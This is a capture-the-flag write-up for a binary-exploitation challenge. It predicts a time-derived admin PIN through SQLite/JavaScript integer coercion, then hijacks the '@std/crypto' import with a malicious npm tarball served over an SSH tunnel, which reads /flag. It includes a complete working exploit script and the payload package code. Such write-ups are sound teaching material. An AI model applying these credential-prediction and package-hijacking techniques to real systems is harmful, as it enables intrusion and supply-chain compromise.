# Secure Communication - CTF Writeup

## Challenge Overview

**Target:** `chal.polyuctf.com:36191`  (This is the port number I will reference throughout the writeup, this can be replaced with the actual port)
**Category:** Pwn (Binary Exploitation)  
**Technologies:** Bun.js, RSA-OAEP encryption, SQLite, npm package management

The challenge presents a line-based encrypted communication service using RSA-OAEP/SHA-512. Upon connection, the server prints its public key and expects the client to send their own SPKI public key. All subsequent communication is encrypted using RSA-OAEP.

## Protocol Analysis

### Handshake
1. Server sends: `My Public Key: <base64 SPKI>`
2. Server prompts: `Your Public Key: `
3. Client sends their SPKI public key (base64)
4. Server confirms: `Public Key imported successfully.`

### Encrypted Communication
- Each request: base64(RSA-OAEP ciphertext to server public key)
- Each response: base64(RSA-OAEP ciphertext to client public key)
- Payloads parsed with JSON5

### Available Commands
- `register`: Create user account with username and PIN
- `login`: Authenticate with username and PIN
- `ping`: Execute ping command (requires login)
- `install`: Install npm package via `bun add` (requires admin)
- `exit`: Close connection

## Vulnerability Discovery

### The Admin PIN Bug

The critical vulnerability lies in how the admin PIN is generated and stored:

```javascript
// From the bundled source
var time = Date.now();
time -= time % 5000;  // Round down to nearest 5 seconds
var insertUser = db.prepare("INSERT INTO users (username, pin, admin) VALUES (?, ?, ?)");
insertUser.run("admin", BigInt(time) ** 2n, true);
```

The admin PIN is calculated as `(floor(Date.now()/5000)*5000)^2` as a BigInt.

**The Problem:** SQLite INTEGER type has limitations. When the BigInt square is stored:
1. Large BigInt values get coerced through SQLite's INTEGER type
2. The stored value becomes a signed 64-bit representation with additional JavaScript Number precision loss
3. Login comparison uses: `user.pin === parseInt(message.pin)`

### SQLite/JS Coercion Analysis

Testing locally revealed the exact coercion behavior:

```javascript
// Bun/SQLite behavior
const big = BigInt(time) ** 2n;  // Huge number
// After SQLite storage and retrieval:
// Value is coerced to: ((t*t) & 0xFFFFFFFFFFFFFFFF) as signed 64-bit
// Then converted to JS Number (float64) with precision loss
```

The working formula for the PIN:
```python
t = floor(current_time_ms / 5000) * 5000
mod = (t * t) & ((1 << 64) - 1)  # Low 64 bits
if mod >= (1 << 63):
    signed = mod - (1 << 64)  # Convert to signed
else:
    signed = mod
pin = str(int(float(signed)))  # Apply float precision loss
```

## Exploitation Steps

### Step 1: Verify Fresh Process Per Connection

Testing showed each connection generates a new RSA key pair:

```python
from pwn import remote
import base64
from cryptography.hazmat.primitives import serialization

def get_server_key():
    io = remote('chal.polyuctf.com', 36191)
    line = io.recvline().decode()
    key_b64 = line.split(": ", 1)[1]
    io.close()
    return key_b64

# Two consecutive connections
key1 = get_server_key()
key2 = get_server_key()
print(f"Keys different: {key1 != key2}")  # True - fresh process!
```

**Result:** Each connection starts a fresh Bun process, meaning the SQLite database is recreated each time with a new admin PIN based on the server's current time.

### Step 2: Bruteforce Admin PIN

Since the PIN changes every 5 seconds based on server time, we need to try multiple time buckets around the current time:

```python
def login_admin(io, client_key, server_pub):
    now_ms = int(time.time() * 1000)
    
    for delta in range(-30000, 30001, 5000):  # ±30 seconds
        t = now_ms + delta
        t -= t % 5000  # Round to 5-second bucket
        
        # Calculate coerced PIN
        mod = (t * t) & ((1 << 64) - 1)
        signed = mod - (1 << 64) if mod >= (1 << 63) else mod
        pin = str(int(float(signed)))
        
        # Try login
        msg = f'{{command:"login",username:"admin",pin:"{pin}"}}'
        io.sendline(encrypt(server_pub, msg))
        response = decrypt(io.recvline(), client_key)
        
        if "Login successful" in response:
            return pin, t
```

**Successful Login:**
```
t = 1773384305000
pin = -1270186039882253824
Response: "Login successful. Welcome, admin!"
```

### Step 3: Install Malicious Package

The `install` command runs `bun add --no-save --no-cache <package>` as admin. The service uses `@std/crypto` internally. We can hijack this import by:

1. Creating a malicious package that replaces `@std/crypto`
2. Hosting it via an HTTP tunnel
3. Installing it via the alias syntax: `@std/crypto@<url>`

**Malicious Package Structure:**
```json
// package/package.json
{
  "name": "leakstdcrypto",
  "version": "1.0.0",
  "type": "module"
}
```

```javascript
// package/crypto.js
import { readFileSync } from "node:fs";
console.log("FLAG_LEAK:", readFileSync("/flag", "utf8").trim());
export const crypto = globalThis.crypto;
```

**Create and host tarball:**
```bash
# Create tarball
tar czf leakstdcrypto.tgz package/

# Start HTTP server
python3 -m http.server 8014 --directory .

# Create tunnel via localhost.run
ssh -R 80:127.0.0.1:8014 localhost.run
# Output: https://9b82a2f075fcd6.lhr.life tunneled with tls termination
```

**Install via admin command:**
```json
{
  "command": "install",
  "package": "@std/crypto@https://9b82a2f075fcd6.lhr.life/leakstdcrypto.tgz"
}
```

**Server Response:**
```
Package @std/crypto@https://9b82a2f075fcd6.lhr.life/leakstdcrypto.tgz installed successfully.
```

### Step 4: Extract Flag

Since each connection is a fresh process, the next connection will:
1. Start Bun runtime
2. Import `@std/crypto/crypto` (our malicious version)
3. Execute our code that reads `/flag`
4. Print the flag before completing initialization

```python
# Fresh connection after package installation
io = remote('chal.polyuctf.com', 36191)
# The server prints its public key...
# But also prints our leaked flag!
leak_line = io.recvline().decode()
# FLAG_LEAK: PUCTF26{b0n_i5_f0n_w1t2_s3l7t5_XS0uSWQ5frJjdpLskToXm3fXTjDmGNR9}
```

## Complete Exploit Code

```python
#!/usr/bin/env python3
import base64
import json
import os
import re
import select
import shutil
import subprocess
import tarfile
import time
from pathlib import Path

from pwn import remote
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

HOST = "chal.polyuctf.com"
PORT = 36191
WORKDIR = Path("/tmp/securecomm-final")
PKGDIR = WORKDIR / "pkg"
TARBALL = PKGDIR / "leakstdcrypto.tgz"
LOCAL_HTTP_PORT = 8014


def build_package():
    """Create malicious @std/crypto replacement"""
    shutil.rmtree(WORKDIR, ignore_errors=True)
    (PKGDIR / "package").mkdir(parents=True, exist_ok=True)
    
    pkg_json = {
        "name": "leakstdcrypto",
        "version": "1.0.0",
        "type": "module",
    }
    (PKGDIR / "package" / "package.json").write_text(json.dumps(pkg_json))
    
    # Payload: read and print /flag, then export real crypto
    (PKGDIR / "package" / "crypto.js").write_text(
        'import { readFileSync } from "node:fs";\n'
        'console.log("FLAG_LEAK:", readFileSync("/flag", "utf8").trim());\n'
        'export const crypto = globalThis.crypto;\n'
    )
    
    with tarfile.open(TARBALL, "w:gz") as tar:
        tar.add(PKGDIR / "package", arcname="package")


def start_http_server():
    """Start local HTTP server for package"""
    return subprocess.Popen(
        ["python3", "-m", "http.server", str(LOCAL_HTTP_PORT), 
         "--directory", str(PKGDIR)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def start_tunnel():
    """Create SSH tunnel via localhost.run"""
    proc = subprocess.Popen(
        [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-R", f"80:127.0.0.1:{LOCAL_HTTP_PORT}",
            "localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    
    url = None
    deadline = time.time() + 40
    while time.time() < deadline:
        r, _, _ = select.select([proc.stdout], [], [], 1)
        if not r:
            continue
        line = proc.stdout.readline()
        if not line:
            continue
        print(line.rstrip())
        if "tunneled with tls termination" in line:
            m = re.search(r"(https://[A-Za-z0-9.-]+)", line)
            if m:
                url = m.group(1)
                break
    
    if not url:
        raise RuntimeError("Failed to obtain tunnel URL")
    return proc, url


class Client:
    """RSA-OAEP encrypted client"""
    def __init__(self, host, port):
        self.io = remote(host, port)
        self.key = rsa.generate_private_key(
            public_exponent=65537, key_size=4096
        )
        self.pub_b64 = base64.b64encode(
            self.key.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        )
        
        # Receive server key
        line = self.io.recvline().decode().strip()
        assert line.startswith("My Public Key: ")
        self.server_key_b64 = line.split(": ", 1)[1]
        self.server_pub = serialization.load_der_public_key(
            base64.b64decode(self.server_key_b64)
        )
        
        # Send our key
        self.io.recvuntil(b"Your Public Key: ")
        self.io.sendline(self.pub_b64)
        print(self.io.recvline().decode().strip())

    def enc(self, s: str) -> bytes:
        return base64.b64encode(
            self.server_pub.encrypt(
                s.encode(),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA512()),
                    algorithm=hashes.SHA512(),
                    label=None,
                ),
            )
        )

    def dec(self, line: bytes) -> str:
        return self.key.decrypt(
            base64.b64decode(line),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA512()),
                algorithm=hashes.SHA512(),
                label=None,
            ),
        ).decode()

    def cmd_one(self, raw: str) -> str:
        self.io.sendline(self.enc(raw))
        return self.dec(self.io.recvline().strip())

    def close(self):
        self.io.close()


def login_admin(client: Client):
    """Bruteforce admin PIN using SQLite coercion logic"""
    now_ms = int(time.time() * 1000)
    
    for delta in range(-30000, 30001, 5000):
        t = now_ms + delta
        t -= t % 5000
        
        # Calculate expected PIN after SQLite/JS coercion
        mod = (t * t) & ((1 << 64) - 1)
        signed = mod - (1 << 64) if mod >= (1 << 63) else mod
        pin = str(int(float(signed)))
        
        resp = client.cmd_one(
            f'{{command:"login",username:"admin",pin:"{pin}"}}'
        )
        print(f"t={t} pin={pin} -> {resp}")
        
        if "Login successful" in resp:
            return pin, t
    
    raise RuntimeError("Admin login failed")


def main():
    # Setup malicious package
    build_package()
    
    http_proc = start_http_server()
    tunnel_proc = None
    
    try:
        # Create tunnel
        tunnel_proc, tunnel_url = start_tunnel()
        print(f"Tunnel URL: {tunnel_url}")
        
        # Login as admin and install malicious package
        c = Client(HOST, PORT)
        pin, bucket = login_admin(c)
        print(f"Admin PIN: {pin} (bucket {bucket})")
        
        install_spec = f'@std/crypto@{tunnel_url}/{TARBALL.name}'
        resp = c.cmd_one(f'{{command:"install",package:"{install_spec}"}}')
        print(f"Install: {resp}")
        c.close()
        
        # Fresh connection - imports our malicious package
        io = remote(HOST, PORT)
        line = io.recvline(timeout=15)
        if not line:
            raise RuntimeError("No response")
        
        leak = line.decode(errors="replace").strip()
        print(f"Leak: {leak}")
        
        m = re.search(r"FLAG_LEAK:\s*(.+)$", leak)
        if m:
            print(f"\n[+] FLAG: {m.group(1)}")
        
        io.close()
        
    finally:
        if tunnel_proc:
            tunnel_proc.terminate()
            try:
                tunnel_proc.wait(timeout=5)
            except:
                tunnel_proc.kill()
        http_proc.terminate()
        try:
            http_proc.wait(timeout=5)
        except:
            http_proc.kill()


if __name__ == "__main__":
    main()
```

## Key Exploitation Techniques

1. **Numeric Coercion Exploitation:** Understanding how Bun/SQLite coerced large BigInt values allowed us to predict the admin PIN within a narrow time window.

2. **Fresh Process Detection:** By comparing server public keys across connections, we confirmed each connection spawns a new process, meaning:
   - Admin PIN changes every connection
   - We need a new connection to trigger the import after installation

3. **NPM Alias Hijacking:** Using Bun's `@scope/name@<url>` syntax to install a malicious package that replaces the legitimate `@std/crypto` module.

4. **Import-Time Code Execution:** The service imports `@std/crypto/crypto` on startup, so our malicious code executes before the handshake completes, leaking the flag via stdout.

## Flag

```
PUCTF26{b0n_i5_f0n_w1t2_s3l7t5_XS0uSWQ5frJjdpLskToXm3fXTjDmGNR9}
```
